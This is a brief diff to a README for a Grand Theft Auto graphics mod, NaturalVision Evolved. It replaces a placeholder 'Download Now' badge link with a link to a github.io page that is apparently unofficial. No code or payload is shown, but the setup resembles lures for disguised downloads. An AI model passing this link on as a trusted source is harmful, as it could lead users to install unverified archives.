@@ -6,7 +6,7 @@ NaturalVision Evolved (NVE) is a next-generation graphical overhaul mod for Gran
 ---
 
 ## 🧰 Installation
-[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://naturalvision-evolved-gta5-mod.github.io/.github/)
 
 Unzip the archive to a separate folder.  
 
